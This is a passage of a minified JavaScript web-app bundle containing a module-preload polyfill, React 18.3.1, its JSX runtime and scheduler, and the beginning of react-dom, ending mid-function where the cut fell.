var Nh = e => {
  throw TypeError(e)
};
var rc = (e, t, n) => t.has(e) || Nh("Cannot " + n);
var k = (e, t, n) => (rc(e, t, "read from private field"), n ? n.call(e) : t.get(e)),
  ae = (e, t, n) => t.has(e) ? Nh("Cannot add the same private member more than once") : t instanceof WeakSet ? t.add(e) : t.set(e, n),
  ne = (e, t, n, r) => (rc(e, t, "write to private field"), r ? r.call(e, n) : t.set(e, n), n),
  $e = (e, t, n) => (rc(e, t, "access private method"), n);
var Fi = (e, t, n, r) => ({
  set _(s) {
    ne(e, t, s, n)
  },
  get _() {
    return k(e, t, r)
  }
});

function Sw(e, t) {
  for (var n = 0; n < t.length; n++) {
    const r = t[n];
    if (typeof r != "string" && !Array.isArray(r)) {
      for (const s in r)
        if (s !== "default" && !(s in e)) {
          const o = Object.getOwnPropertyDescriptor(r, s);
          o && Object.defineProperty(e, s, o.get ? o : {
            enumerable: !0,
            get: () => r[s]
          })
        }
    }
  }
  return Object.freeze(Object.defineProperty(e, Symbol.toStringTag, {
    value: "Module"
  }))
} (function () {
  const t = document.createElement("link").relList;
  if (t && t.supports && t.supports("modulepreload")) return;
  for (const s of document.querySelectorAll('link[rel="modulepreload"]')) r(s);
  new MutationObserver(s => {
    for (const o of s)
      if (o.type === "childList")
        for (const i of o.addedNodes) i.tagName === "LINK" && i.rel === "modulepreload" && r(i)
  }).observe(document, {
    childList: !0,
    subtree: !0
  });

  function n(s) {
    const o = {};
    return s.integrity && (o.integrity = s.integrity), s.referrerPolicy && (o.referrerPolicy = s.referrerPolicy), s.crossOrigin === "use-credentials" ? o.credentials = "include" : s.crossOrigin === "anonymous" ? o.credentials = "omit" : o.credentials = "same-origin", o
  }

  function r(s) {
    if (s.ep) return;
    s.ep = !0;
    const o = n(s);
    fetch(s.href, o)
  }
})();

function Kg(e) {
  return e && e.__esModule && Object.prototype.hasOwnProperty.call(e, "default") ? e.default : e
}
var Qg = {
  exports: {}
},
  gl = {},
  Gg = {
    exports: {}
  },
  se = {};
/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var vi = Symbol.for("react.element"),
  Cw = Symbol.for("react.portal"),
  Nw = Symbol.for("react.fragment"),
  jw = Symbol.for("react.strict_mode"),
  Aw = Symbol.for("react.profiler"),
  Pw = Symbol.for("react.provider"),
  Ew = Symbol.for("react.context"),
  Tw = Symbol.for("react.forward_ref"),
  kw = Symbol.for("react.suspense"),
  Rw = Symbol.for("react.memo"),
  Dw = Symbol.for("react.lazy"),
  jh = Symbol.iterator;

function Mw(e) {
  return e === null || typeof e != "object" ? null : (e = jh && e[jh] || e["@@iterator"], typeof e == "function" ? e : null)
}
var qg = {
  isMounted: function () {
    return !1
  },
  enqueueForceUpdate: function () { },
  enqueueReplaceState: function () { },
  enqueueSetState: function () { }
},
  Yg = Object.assign,
  Xg = {};

function qs(e, t, n) {
  this.props = e, this.context = t, this.refs = Xg, this.updater = n || qg
}
qs.prototype.isReactComponent = {};
qs.prototype.setState = function (e, t) {
  if (typeof e != "object" && typeof e != "function" && e != null) throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");
  this.updater.enqueueSetState(this, e, t, "setState")
};
qs.prototype.forceUpdate = function (e) {
  this.updater.enqueueForceUpdate(this, e, "forceUpdate")
};

function Jg() { }
Jg.prototype = qs.prototype;

function Pd(e, t, n) {
  this.props = e, this.context = t, this.refs = Xg, this.updater = n || qg
}
var Ed = Pd.prototype = new Jg;
Ed.constructor = Pd;
Yg(Ed, qs.prototype);
Ed.isPureReactComponent = !0;
var Ah = Array.isArray,
  Zg = Object.prototype.hasOwnProperty,
  Td = {
    current: null
  },
  e0 = {
    key: !0,
    ref: !0,
    __self: !0,
    __source: !0
  };

function t0(e, t, n) {
  var r, s = {},
    o = null,
    i = null;
  if (t != null)
    for (r in t.ref !== void 0 && (i = t.ref), t.key !== void 0 && (o = "" + t.key), t) Zg.call(t, r) && !e0.hasOwnProperty(r) && (s[r] = t[r]);
  var a = arguments.length - 2;
  if (a === 1) s.children = n;
  else if (1 < a) {
    for (var c = Array(a), u = 0; u < a; u++) c[u] = arguments[u + 2];
    s.children = c
  }
  if (e && e.defaultProps)
    for (r in a = e.defaultProps, a) s[r] === void 0 && (s[r] = a[r]);
  return {
    $$typeof: vi,
    type: e,
    key: o,
    ref: i,
    props: s,
    _owner: Td.current
  }
}

function _w(e, t) {
  return {
    $$typeof: vi,
    type: e.type,
    key: t,
    ref: e.ref,
    props: e.props,
    _owner: e._owner
  }
}

function kd(e) {
  return typeof e == "object" && e !== null && e.$$typeof === vi
}

function Iw(e) {
  var t = {
    "=": "=0",
    ":": "=2"
  };
  return "$" + e.replace(/[=:]/g, function (n) {
    return t[n]
  })
}
var Ph = /\/+/g;

function sc(e, t) {
  return typeof e == "object" && e !== null && e.key != null ? Iw("" + e.key) : t.toString(36)
}

function da(e, t, n, r, s) {
  var o = typeof e;
  (o === "undefined" || o === "boolean") && (e = null);
  var i = !1;
  if (e === null) i = !0;
  else switch (o) {
    case "string":
    case "number":
      i = !0;
      break;
    case "object":
      switch (e.$$typeof) {
        case vi:
        case Cw:
          i = !0
      }
  }
  if (i) return i = e, s = s(i), e = r === "" ? "." + sc(i, 0) : r, Ah(s) ? (n = "", e != null && (n = e.replace(Ph, "$&/") + "/"), da(s, t, n, "", function (u) {
    return u
  })) : s != null && (kd(s) && (s = _w(s, n + (!s.key || i && i.key === s.key ? "" : ("" + s.key).replace(Ph, "$&/") + "/") + e)), t.push(s)), 1;
  if (i = 0, r = r === "" ? "." : r + ":", Ah(e))
    for (var a = 0; a < e.length; a++) {
      o = e[a];
      var c = r + sc(o, a);
      i += da(o, t, n, c, s)
    } else if (c = Mw(e), typeof c == "function")
    for (e = c.call(e), a = 0; !(o = e.next()).done;) o = o.value, c = r + sc(o, a++), i += da(o, t, n, c, s);
  else if (o === "object") throw t = String(e), Error("Objects are not valid as a React child (found: " + (t === "[object Object]" ? "object with keys {" + Object.keys(e).join(", ") + "}" : t) + "). If you meant to render a collection of children, use an array instead.");
  return i
}

function Vi(e, t, n) {
  if (e == null) return e;
  var r = [],
    s = 0;
  return da(e, r, "", "", function (o) {
    return t.call(n, o, s++)
  }), r
}

function Lw(e) {
  if (e._status === -1) {
    var t = e._result;
    t = t(), t.then(function (n) {
      (e._status === 0 || e._status === -1) && (e._status = 1, e._result = n)
    }, function (n) {
      (e._status === 0 || e._status === -1) && (e._status = 2, e._result = n)
    }), e._status === -1 && (e._status = 0, e._result = t)
  }
  if (e._status === 1) return e._result.default;
  throw e._result
}
var ot = {
  current: null
},
  fa = {
    transition: null
  },
  Ow = {
    ReactCurrentDispatcher: ot,
    ReactCurrentBatchConfig: fa,
    ReactCurrentOwner: Td
  };

function n0() {
  throw Error("act(...) is not supported in production builds of React.")
}
se.Children = {
  map: Vi,
  forEach: function (e, t, n) {
    Vi(e, function () {
      t.apply(this, arguments)
    }, n)
  },
  count: function (e) {
    var t = 0;
    return Vi(e, function () {
      t++
    }), t
  },
  toArray: function (e) {
    return Vi(e, function (t) {
      return t
    }) || []
  },
  only: function (e) {
    if (!kd(e)) throw Error("React.Children.only expected to receive a single React element child.");
    return e
  }
};
se.Component = qs;
se.Fragment = Nw;
se.Profiler = Aw;
se.PureComponent = Pd;
se.StrictMode = jw;
se.Suspense = kw;
se.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = Ow;
se.act = n0;
se.cloneElement = function (e, t, n) {
  if (e == null) throw Error("React.cloneElement(...): The argument must be a React element, but you passed " + e + ".");
  var r = Yg({}, e.props),
    s = e.key,
    o = e.ref,
    i = e._owner;
  if (t != null) {
    if (t.ref !== void 0 && (o = t.ref, i = Td.current), t.key !== void 0 && (s = "" + t.key), e.type && e.type.defaultProps) var a = e.type.defaultProps;
    for (c in t) Zg.call(t, c) && !e0.hasOwnProperty(c) && (r[c] = t[c] === void 0 && a !== void 0 ? a[c] : t[c])
  }
  var c = arguments.length - 2;
  if (c === 1) r.children = n;
  else if (1 < c) {
    a = Array(c);
    for (var u = 0; u < c; u++) a[u] = arguments[u + 2];
    r.children = a
  }
  return {
    $$typeof: vi,
    type: e.type,
    key: s,
    ref: o,
    props: r,
    _owner: i
  }
};
se.createContext = function (e) {
  return e = {
    $$typeof: Ew,
    _currentValue: e,
    _currentValue2: e,
    _threadCount: 0,
    Provider: null,
    Consumer: null,
    _defaultValue: null,
    _globalName: null
  }, e.Provider = {
    $$typeof: Pw,
    _context: e
  }, e.Consumer = e
};
se.createElement = t0;
se.createFactory = function (e) {
  var t = t0.bind(null, e);
  return t.type = e, t
};
se.createRef = function () {
  return {
    current: null
  }
};
se.forwardRef = function (e) {
  return {
    $$typeof: Tw,
    render: e
  }
};
se.isValidElement = kd;
se.lazy = function (e) {
  return {
    $$typeof: Dw,
    _payload: {
      _status: -1,
      _result: e
    },
    _init: Lw
  }
};
se.memo = function (e, t) {
  return {
    $$typeof: Rw,
    type: e,
    compare: t === void 0 ? null : t
  }
};
se.startTransition = function (e) {
  var t = fa.transition;
  fa.transition = {};
  try {
    e()
  } finally {
    fa.transition = t
  }
};
se.unstable_act = n0;
se.useCallback = function (e, t) {
  return ot.current.useCallback(e, t)
};
se.useContext = function (e) {
  return ot.current.useContext(e)
};
se.useDebugValue = function () { };
se.useDeferredValue = function (e) {
  return ot.current.useDeferredValue(e)
};
se.useEffect = function (e, t) {
  return ot.current.useEffect(e, t)
};
se.useId = function () {
  return ot.current.useId()
};
se.useImperativeHandle = function (e, t, n) {
  return ot.current.useImperativeHandle(e, t, n)
};
se.useInsertionEffect = function (e, t) {
  return ot.current.useInsertionEffect(e, t)
};
se.useLayoutEffect = function (e, t) {
  return ot.current.useLayoutEffect(e, t)
};
se.useMemo = function (e, t) {
  return ot.current.useMemo(e, t)
};
se.useReducer = function (e, t, n) {
  return ot.current.useReducer(e, t, n)
};
se.useRef = function (e) {
  return ot.current.useRef(e)
};
se.useState = function (e) {
  return ot.current.useState(e)
};
se.useSyncExternalStore = function (e, t, n) {
  return ot.current.useSyncExternalStore(e, t, n)
};
se.useTransition = function () {
  return ot.current.useTransition()
};
se.version = "18.3.1";
Gg.exports = se;
var x = Gg.exports;
const ce = Kg(x),
  Fw = Sw({
    __proto__: null,
    default: ce
  }, [x]);
/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var Vw = x,
  Bw = Symbol.for("react.element"),
  zw = Symbol.for("react.fragment"),
  Uw = Object.prototype.hasOwnProperty,
  $w = Vw.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,
  Hw = {
    key: !0,
    ref: !0,
    __self: !0,
    __source: !0
  };

function r0(e, t, n) {
  var r, s = {},
    o = null,
    i = null;
  n !== void 0 && (o = "" + n), t.key !== void 0 && (o = "" + t.key), t.ref !== void 0 && (i = t.ref);
  for (r in t) Uw.call(t, r) && !Hw.hasOwnProperty(r) && (s[r] = t[r]);
  if (e && e.defaultProps)
    for (r in t = e.defaultProps, t) s[r] === void 0 && (s[r] = t[r]);
  return {
    $$typeof: Bw,
    type: e,
    key: o,
    ref: i,
    props: s,
    _owner: $w.current
  }
}
gl.Fragment = zw;
gl.jsx = r0;
gl.jsxs = r0;
Qg.exports = gl;
var l = Qg.exports,
  s0 = {
    exports: {}
  },
  St = {},
  o0 = {
    exports: {}
  },
  i0 = {};
/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
(function (e) {
  function t(D, R) {
    var L = D.length;
    D.push(R);
    e: for (; 0 < L;) {
      var J = L - 1 >>> 1,
        oe = D[J];
      if (0 < s(oe, R)) D[J] = R, D[L] = oe, L = J;
      else break e
    }
  }

  function n(D) {
    return D.length === 0 ? null : D[0]
  }

  function r(D) {
    if (D.length === 0) return null;
    var R = D[0],
      L = D.pop();
    if (L !== R) {
      D[0] = L;
      e: for (var J = 0, oe = D.length, ze = oe >>> 1; J < ze;) {
        var Ue = 2 * (J + 1) - 1,
          wr = D[Ue],
          Je = Ue + 1,
          dn = D[Je];
        if (0 > s(wr, L)) Je < oe && 0 > s(dn, wr) ? (D[J] = dn, D[Je] = L, J = Je) : (D[J] = wr, D[Ue] = L, J = Ue);
        else if (Je < oe && 0 > s(dn, L)) D[J] = dn, D[Je] = L, J = Je;
        else break e
      }
    }
    return R
  }

  function s(D, R) {
    var L = D.sortIndex - R.sortIndex;
    return L !== 0 ? L : D.id - R.id
  }
  if (typeof performance == "object" && typeof performance.now == "function") {
    var o = performance;
    e.unstable_now = function () {
      return o.now()
    }
  } else {
    var i = Date,
      a = i.now();
    e.unstable_now = function () {
      return i.now() - a
    }
  }
  var c = [],
    u = [],
    d = 1,
    f = null,
    h = 3,
    y = !1,
    w = !1,
    v = !1,
    S = typeof setTimeout == "function" ? setTimeout : null,
    g = typeof clearTimeout == "function" ? clearTimeout : null,
    p = typeof setImmediate < "u" ? setImmediate : null;
  typeof navigator < "u" && navigator.scheduling !== void 0 && navigator.scheduling.isInputPending !== void 0 && navigator.scheduling.isInputPending.bind(navigator.scheduling);

  function m(D) {
    for (var R = n(u); R !== null;) {
      if (R.callback === null) r(u);
      else if (R.startTime <= D) r(u), R.sortIndex = R.expirationTime, t(c, R);
      else break;
      R = n(u)
    }
  }

  function b(D) {
    if (v = !1, m(D), !w)
      if (n(c) !== null) w = !0, re(C);
      else {
        var R = n(u);
        R !== null && X(b, R.startTime - D)
      }
  }

  function C(D, R) {
    w = !1, v && (v = !1, g(P), P = -1), y = !0;
    var L = h;
    try {
      for (m(R), f = n(c); f !== null && (!(f.expirationTime > R) || D && !G());) {
        var J = f.callback;
        if (typeof J == "function") {
          f.callback = null, h = f.priorityLevel;
          var oe = J(f.expirationTime <= R);
          R = e.unstable_now(), typeof oe == "function" ? f.callback = oe : f === n(c) && r(c), m(R)
        } else r(c);
        f = n(c)
      }
      if (f !== null) var ze = !0;
      else {
        var Ue = n(u);
        Ue !== null && X(b, Ue.startTime - R), ze = !1
      }
      return ze
    } finally {
      f = null, h = L, y = !1
    }
  }
  var j = !1,
    A = null,
    P = -1,
    M = 5,
    _ = -1;

  function G() {
    return !(e.unstable_now() - _ < M)
  }

  function I() {
    if (A !== null) {
      var D = e.unstable_now();
      _ = D;
      var R = !0;
      try {
        R = A(!0, D)
      } finally {
        R ? $() : (j = !1, A = null)
      }
    } else j = !1
  }
  var $;
  if (typeof p == "function") $ = function () {
    p(I)
  };
  else if (typeof MessageChannel < "u") {
    var U = new MessageChannel,
      te = U.port2;
    U.port1.onmessage = I, $ = function () {
      te.postMessage(null)
    }
  } else $ = function () {
    S(I, 0)
  };

  function re(D) {
    A = D, j || (j = !0, $())
  }

  function X(D, R) {
    P = S(function () {
      D(e.unstable_now())
    }, R)
  }
  e.unstable_IdlePriority = 5, e.unstable_ImmediatePriority = 1, e.unstable_LowPriority = 4, e.unstable_NormalPriority = 3, e.unstable_Profiling = null, e.unstable_UserBlockingPriority = 2, e.unstable_cancelCallback = function (D) {
    D.callback = null
  }, e.unstable_continueExecution = function () {
    w || y || (w = !0, re(C))
  }, e.unstable_forceFrameRate = function (D) {
    0 > D || 125 < D ? console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported") : M = 0 < D ? Math.floor(1e3 / D) : 5
  }, e.unstable_getCurrentPriorityLevel = function () {
    return h
  }, e.unstable_getFirstCallbackNode = function () {
    return n(c)
  }, e.unstable_next = function (D) {
    switch (h) {
      case 1:
      case 2:
      case 3:
        var R = 3;
        break;
      default:
        R = h
    }
    var L = h;
    h = R;
    try {
      return D()
    } finally {
      h = L
    }
  }, e.unstable_pauseExecution = function () { }, e.unstable_requestPaint = function () { }, e.unstable_runWithPriority = function (D, R) {
    switch (D) {
      case 1:
      case 2:
      case 3:
      case 4:
      case 5:
        break;
      default:
        D = 3
    }
    var L = h;
    h = D;
    try {
      return R()
    } finally {
      h = L
    }
  }, e.unstable_scheduleCallback = function (D, R, L) {
    var J = e.unstable_now();
    switch (typeof L == "object" && L !== null ? (L = L.delay, L = typeof L == "number" && 0 < L ? J + L : J) : L = J, D) {
      case 1:
        var oe = -1;
        break;
      case 2:
        oe = 250;
        break;
      case 5:
        oe = 1073741823;
        break;
      case 4:
        oe = 1e4;
        break;
      default:
        oe = 5e3
    }
    return oe = L + oe, D = {
      id: d++,
      callback: R,
      priorityLevel: D,
      startTime: L,
      expirationTime: oe,
      sortIndex: -1
    }, L > J ? (D.sortIndex = L, t(u, D), n(c) === null && D === n(u) && (v ? (g(P), P = -1) : v = !0, X(b, L - J))) : (D.sortIndex = oe, t(c, D), w || y || (w = !0, re(C))), D
  }, e.unstable_shouldYield = G, e.unstable_wrapCallback = function (D) {
    var R = h;
    return function () {
      var L = h;
      h = R;
      try {
        return D.apply(this, arguments)
      } finally {
        h = L
      }
    }
  }
})(i0);
o0.exports = i0;
var Ww = o0.exports;
/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var Kw = x,
  wt = Ww;

function O(e) {
  for (var t = "https://reactjs.org/docs/error-decoder.html?invariant=" + e, n = 1; n < arguments.length; n++) t += "&args[]=" + encodeURIComponent(arguments[n]);
  return "Minified React error #" + e + "; visit " + t + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
}
var a0 = new Set,
  $o = {};

function Wr(e, t) {
  _s(e, t), _s(e + "Capture", t)
}

function _s(e, t) {
  for ($o[e] = t, e = 0; e < t.length; e++) a0.add(t[e])
}
var En = !(typeof window > "u" || typeof window.document > "u" || typeof window.document.createElement > "u"),
  iu = Object.prototype.hasOwnProperty,
  Qw = /^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,
  Eh = {},
  Th = {};

function Gw(e) {
  return iu.call(Th, e) ? !0 : iu.call(Eh, e) ? !1 : Qw.test(e) ? Th[e] = !0 : (Eh[e] = !0, !1)
}

function qw(e, t, n, r) {
  if (n !== null && n.type === 0) return !1;
  switch (typeof t) {
    case "function":
    case "symbol":
      return !0;
    case "boolean":
      return r ? !1 : n !== null ? !n.acceptsBooleans : (e = e.toLowerCase().slice(0, 5), e !== "data-" && e !== "aria-");
    default:
      return !1
  }
}

function Yw(e, t, n, r) {
  if (t === null || typeof t > "u" || qw(e, t, n, r)) return !0;
  if (r) return !1;
  if (n !== null) switch (n.type) {
    case 3:
      return !t;
    case 4:
      return t === !1;
    case 5:
      return isNaN(t);
    case 6:
      return isNaN(t) || 1 > t
  }
  return !1
}

function it(e, t, n, r, s, o, i) {
  this.acceptsBooleans = t === 2 || t === 3 || t === 4, this.attributeName = r, this.attributeNamespace = s, this.mustUseProperty = n, this.propertyName = e, this.type = t, this.sanitizeURL = o, this.removeEmptyString = i
}
var Be = {};
"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function (e) {
  Be[e] = new it(e, 0, !1, e, null, !1, !1)
});
[
  ["acceptCharset", "accept-charset"],
  ["className", "class"],
  ["htmlFor", "for"],
  ["httpEquiv", "http-equiv"]
].forEach(function (e) {
  var t = e[0];
  Be[t] = new it(t, 1, !1, e[1], null, !1, !1)
});
["contentEditable", "draggable", "spellCheck", "value"].forEach(function (e) {
  Be[e] = new it(e, 2, !1, e.toLowerCase(), null, !1, !1)
});
["autoReverse", "externalResourcesRequired", "focusable", "preserveAlpha"].forEach(function (e) {
  Be[e] = new it(e, 2, !1, e, null, !1, !1)
});
"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function (e) {
  Be[e] = new it(e, 3, !1, e.toLowerCase(), null, !1, !1)
});
["checked", "multiple", "muted", "selected"].forEach(function (e) {
  Be[e] = new it(e, 3, !0, e, null, !1, !1)
});
["capture", "download"].forEach(function (e) {
  Be[e] = new it(e, 4, !1, e, null, !1, !1)
});
["cols", "rows", "size", "span"].forEach(function (e) {
  Be[e] = new it(e, 6, !1, e, null, !1, !1)
});
["rowSpan", "start"].forEach(function (e) {
  Be[e] = new it(e, 5, !1, e.toLowerCase(), null, !1, !1)
});
var Rd = /[\-:]([a-z])/g;

function Dd(e) {
  return e[1].toUpperCase()
}
"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function (e) {
  var t = e.replace(Rd, Dd);
  Be[t] = new it(t, 1, !1, e, null, !1, !1)
});
"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function (e) {
  var t = e.replace(Rd, Dd);
  Be[t] = new it(t, 1, !1, e, "http://www.w3.org/1999/xlink", !1, !1)
});
["xml:base", "xml:lang", "xml:space"].forEach(function (e) {
  var t = e.replace(Rd, Dd);
  Be[t] = new it(t, 1, !1, e, "http://www.w3.org/XML/1998/namespace", !1, !1)
});
["tabIndex", "crossOrigin"].forEach(function (e) {
  Be[e] = new it(e, 1, !1, e.toLowerCase(), null, !1, !1)
});
Be.xlinkHref = new it("xlinkHref", 1, !1, "xlink:href", "http://www.w3.org/1999/xlink", !0, !1);
["src", "href", "action", "formAction"].forEach(function (e) {
  Be[e] = new it(e, 1, !1, e.toLowerCase(), null, !0, !0)
});

function Md(e, t, n, r) {
  var s = Be.hasOwnProperty(t) ? Be[t] : null;
  (s !== null ? s.type !== 0 : r || !(2 < t.length) || t[0] !== "o" && t[0] !== "O" || t[1] !== "n" && t[1] !== "N") && (Yw(t, n, s, r) && (n = null), r || s === null ? Gw(t) && (n === null ? e.removeAttribute(t) : e.setAttribute(t, "" + n)) : s.mustUseProperty ? e[s.propertyName] = n === null ? s.type === 3 ? !1 : "" : n : (t = s.attributeName, r = s.attributeNamespace, n === null ? e.removeAttribute(t) : (s = s.type, n = s === 3 || s === 4 && n === !0 ? "" : "" + n, r ? e.setAttributeNS(r, t, n) : e.setAttribute(t, n))))
}
var _n = Kw.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,
  Bi = Symbol.for("react.element"),
  ts = Symbol.for("react.portal"),
  ns = Symbol.for("react.fragment"),
  _d = Symbol.for("react.strict_mode"),
  au = Symbol.for("react.profiler"),
  l0 = Symbol.for("react.provider"),
  c0 = Symbol.for("react.context"),
  Id = Symbol.for("react.forward_ref"),
  lu = Symbol.for("react.suspense"),
  cu = Symbol.for("react.suspense_list"),
  Ld = Symbol.for("react.memo"),
  Un = Symbol.for("react.lazy"),
  u0 = Symbol.for("react.offscreen"),
  kh = Symbol.iterator;

function ao(e) {
  return e === null || typeof e != "object" ? null : (e = kh && e[kh] || e["@@iterator"], typeof e == "function" ? e : null)
}
var be = Object.assign,
  oc;

function So(e) {
  if (oc === void 0) try {
    throw Error()
  } catch (n) {
    var t = n.stack.trim().match(/\n( *(at )?)/);
    oc = t && t[1] || ""
  }
  return `
` + oc + e
}
var ic = !1;

function ac(e, t) {
  if (!e || ic) return "";
  ic = !0;
  var n = Error.prepareStackTrace;
  Error.prepareStackTrace = void 0;
  try {
    if (t)
      if (t = function () {
        throw Error()
      }, Object.defineProperty(t.prototype, "props", {
        set: function () {
          throw Error()
        }
      }), typeof Reflect == "object" && Reflect.construct) {
        try {
          Reflect.construct(t, [])
        } catch (u) {
          var r = u
        }
        Reflect.construct(e, [], t)
      } else {
        try {
          t.call()
        } catch (u) {
          r = u
        }
        e.call(t.prototype)
      }
    else {
      try {
        throw Error()
      } catch (u) {
        r = u
      }
      e()
    }
  } catch (u) {
    if (u && r && typeof u.stack == "string") {
      for (var s = u.stack.split(`
`), o = r.stack.split(`
`), i = s.length - 1, a = o.length - 1; 1 <= i && 0 <= a && s[i] !== o[a];) a--;
      for (; 1 <= i && 0 <= a; i--, a--)
        if (s[i] !== o[a]) {
          if (i !== 1 || a !== 1)
            do
              if (i--, a--, 0 > a || s[i] !== o[a]) {
                var c = `
` + s[i].replace(" at new ", " at ");
                return e.displayName && c.includes("<anonymous>") && (c = c.replace("<anonymous>", e.displayName)), c
              } while (1 <= i && 0 <= a);
          break
        }
    }
  } finally {
    ic = !1, Error.prepareStackTrace = n
  }
  return (e = e ? e.displayName || e.name : "") ? So(e) : ""
}

function Xw(e) {
  switch (e.tag) {
    case 5:
      return So(e.type);
    case 16:
      return So("Lazy");
    case 13:
      return So("Suspense");
    case 19:
      return So("SuspenseList");
    case 0:
    case 2:
    case 15:
      return e = ac(e.type, !1), e;
    case 11:
      return e = ac(e.type.render, !1), e;
    case 1:
      return e = ac(e.type, !0), e;
    default:
      return ""
  }
}

function uu(e) {
  if (e == null) return null;
  if (typeof e == "function") return e.displayName || e.name || null;
  if (typeof e == "string") return e;
  switch (e) {
    case ns:
      return "Fragment";
    case ts:
      return "Portal";
    case au:
      return "Profiler";
    case _d:
      return "StrictMode";
    case lu:
      return "Suspense";
    case cu:
      return "SuspenseList"
  }
  if (typeof e == "object") switch (e.$$typeof) {
    case c0:
      return (e.displayName || "Context") + ".Consumer";
    case l0:
      return (e._context.displayName || "Context") + ".Provider";
    case Id:
      var t = e.render;
      return e = e.displayName, e || (e = t.displayName || t.name || "", e = e !== "" ? "ForwardRef(" + e + ")" : "ForwardRef"), e;
    case Ld:
      return t = e.displayName || null, t !== null ? t : uu(e.type) || "Memo";
    case Un:
      t = e._payload, e = e._init;
      try {
        return uu(e(t))
      } catch { }
  }
  return null
}

function Jw(e) {
  var t = e.type;
  switch (e.tag) {
    case 24:
      return "Cache";
    case 9:
      return (t.displayName || "Context") + ".Consumer";
    case 10:
      return (t._context.displayName || "Context") + ".Provider";
    case 18:
      return "DehydratedFragment";
    case 11:
      return e = t.render, e = e.displayName || e.name || "", t.displayName || (e !== "" ? "ForwardRef(" + e + ")" : "ForwardRef");
    case 7:
      return "Fragment";
    case 5:
      return t;
    case 4:
      return "Portal";
    case 3:
      return "Root";
    case 6:
      return "Text";
    case 16:
      return uu(t);
    case 8:
      return t === _d ? "StrictMode" : "Mode";
    case 22:
      return "Offscreen";
    case 12:
      return "Profiler";
    case 21:
      return "Scope";
    case 13:
      return "Suspense";
    case 19:
      return "SuspenseList";
    case 25:
      return "TracingMarker";
    case 1:
    case 0:
    case 17:
    case 2:
    case 14:
    case 15:
      if (typeof t == "function") return t.displayName || t.name || null;
      if (typeof t == "string") return t
  }
  return null
}

function dr(e) {
  switch (typeof e) {
    case "boolean":
    case "number":
    case "string":
    case "undefined":
      return e;
    case "object":
      return e;
    default:
      return ""
  }
}

function d0(e) {
  var t = e.type;
  return (e = e.nodeName) && e.toLowerCase() === "input" && (t === "checkbox" || t === "radio")
}

function Zw(e) {
  var t = d0(e) ? "checked" : "value",
    n = Object.getOwnPropertyDescriptor(e.constructor.prototype, t),
    r = "" + e[t];
  if (!e.hasOwnProperty(t) && typeof n < "u" && typeof n.get == "function" && typeof n.set == "function") {
    var s = n.get,
      o = n.set;
    return Object.defineProperty(e, t, {
      configurable: !0,
      get: function () {
        return s.call(this)
      },
      set: function (i) {
        r = "" + i, o.call(this, i)
      }
    }), Object.defineProperty(e, t, {
      enumerable: n.enumerable
    }), {
      getValue: function () {
        return r
      },
      setValue: function (i) {
        r = "" + i
      },
      stopTracking: function () {
        e._valueTracker = null, delete e[t]
      }
    }
  }
}

function zi(e) {
  e._valueTracker || (e._valueTracker = Zw(e))
}

function f0(e) {
  if (!e) return !1;
  var t = e._valueTracker;
  if (!t) return !0;
  var n = t.getValue(),
    r = "";
  return e && (r = d0(e) ? e.checked ? "true" : "false" : e.value), e = r, e !== n ? (t.setValue(e), !0) : !1
}

function ka(e) {
  if (e = e || (typeof document < "u" ? document : void 0), typeof e > "u") return null;
  try {
    return e.activeElement || e.body
  } catch {
    return e.body
  }
}

function du(e, t) {
  var n = t.checked;
  return be({}, t, {
    defaultChecked: void 0,
    defaultValue: void 0,
    value: void 0,
    checked: n ?? e._wrapperState.initialChecked
  })
}

function Rh(e, t) {
  var n = t.defaultValue == null ? "" : t.defaultValue,
